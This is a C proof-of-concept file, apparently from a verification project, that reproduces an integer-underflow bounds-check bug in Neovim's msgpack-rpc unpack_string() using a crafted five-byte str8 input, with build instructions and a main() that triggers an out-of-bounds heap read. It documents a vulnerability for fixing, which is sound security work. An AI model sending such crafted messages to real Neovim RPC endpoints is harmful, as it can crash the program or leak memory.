// Standalone reproduction of a real bug found by cbmc/harness_msgpack_cbmc.c
// in unpack_string() (neovim/src/nvim/msgpack_rpc/unpacker.c, real and
// unmodified) -- see ../ProjectAnalysisReport.md, "msgpack-rpc wire format"
// section, for the full writeup. This is NOT a fuzz/unit-test harness; it's
// a minimal, deterministic PoC meant to be built with ASan to demonstrate
// the crash directly, independent of CBMC.
//
// The bug: unpack_string() checks `*size < tok.length` to decide whether the
// declared payload length fits in the remaining buffer -- but `*size` is the
// size *before* the type-tag+length header was consumed (`mpack_rtoken()`
// consumes 2/3/5 bytes for a str8/str16/str32 tag), not `size2`, the size
// *after* that header was consumed, which is what the payload actually has
// to fit within. A str8 tag whose declared length equals the *whole original
// buffer* (header included) slips past that guard, and the subsequent
// `size2 - tok.length` underflows.
//
// Concretely, for a 5-byte buffer {0xd9, 0x05, 'a', 'b', 'c'} (str8, declared
// length 5, but the header itself already consumed 2 of those 5 bytes, so
// only 3 payload bytes actually follow):
//   - unpack_string() returns String{ .data = buf+2, .size = 5 } -- claiming
//     5 bytes of payload where only 3 exist.
//   - *size becomes size2 - tok.length = 3 - 5, which wraps to SIZE_MAX-1.
//
// Any code that trusts the returned String's .size (e.g. a memcpy, or just
// printing it) reads 2 bytes past the heap allocation. Any code that trusts
// the corrupted *size for a subsequent unpack call believes there are
// ~2^64 bytes of buffer left and may read arbitrarily far past it. Build
// this file with -fsanitize=address and run it to see the crash directly:
//
//   clang -fsanitize=address,undefined -std=gnu99 -g \
//     -I neovim/build/src/nvim/auto -I neovim/build/include \
//     -I neovim/build/cmake.config -I neovim/src \
//     -I "$(brew --prefix libuv)/include" \
//     -I "$(brew --prefix luajit)/include/luajit-2.1" \
//     cbmc/finding_unpack_string_underflow_repro.c \
//     neovim/src/mpack/mpack_core.c neovim/src/mpack/object.c \
//     neovim/src/mpack/conv.c neovim/src/nvim/msgpack_rpc/unpacker.c \
//     neovim/src/nvim/msgpack_rpc/packer.c \
//     -o /tmp/unpack_string_poc && /tmp/unpack_string_poc

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "nvim/lua/executor.h"
#include "nvim/msgpack_rpc/packer.h"
#include "nvim/msgpack_rpc/unpacker.h"

// Same stub set as unit_tests/tests/test_msgpack.c -- see that file's header
// comment for why each of these exists.
void *xmalloc(size_t size)
{
  void *p = malloc(size);
  if (!p && size) {
    abort();
  }
  return p;
}

void *xrealloc(void *ptr, size_t size)
{
  void *p = realloc(ptr, size);
  if (!p && size) {
    abort();
  }
  return p;
}

void xfree(void *ptr)
{
  free(ptr);
}

char *xstrdup(const char *str)
{
  char *p = strdup(str);
  if (!p) {
    abort();
  }
  return p;
}

void api_free_luaref(LuaRef ref) { abort(); }
void api_set_error(Error *err, ErrorType errType, const char *format, ...) { abort(); }
void *arena_alloc(Arena *arena, size_t size, bool align) { abort(); }
ArenaMem arena_finish(Arena *arena) { abort(); }
void arena_mem_free(ArenaMem mem) { abort(); }
String arena_printf(Arena *arena, const char *fmt, ...) { abort(); }
Object handle_ui_client_redraw(uint64_t channel_id, Array args, Arena *arena, Error *error) { abort(); }
MsgpackRpcRequestHandler msgpack_rpc_get_handler_for(const char *name, size_t name_len, Error *error) { abort(); }
schar_T schar_from_buf(const char *buf, size_t len) { abort(); }
void ui_client_event_grid_line(Array args) { abort(); }
UIClientHandler ui_client_get_redraw_handler(const char *name, size_t name_len, Error *error) { abort(); }

size_t grid_line_buf_size = 0;
schar_T *grid_line_buf_char = NULL;
sattr_T *grid_line_buf_attr = NULL;

int main(void)
{
  unsigned char *buf = malloc(5);
  memcpy(buf, (unsigned char[]){0xd9, 0x05, 'a', 'b', 'c'}, 5);

  const char *data = (const char *)buf;
  size_t size = 5;  // the *whole* buffer, header included

  String s = unpack_string(&data, &size);

  printf("s.data=%p s.size=%zu (buf=%p, valid range ends at buf+5=%p)\n",
         (void *)s.data, s.size, (void *)buf, (void *)(buf + 5));
  printf("*size after the call = %zu (0x%zx) -- should never exceed the\n"
         "original 5, let alone wrap to something astronomically large\n",
         size, size);

  if (s.data != NULL) {
    printf("reading all %zu claimed bytes (this is the out-of-bounds read):\n", s.size);
    for (size_t i = 0; i < s.size; i++) {
      printf("%02x ", (unsigned char)s.data[i]);
    }
    printf("\n");
  }

  free(buf);
  return 0;
}
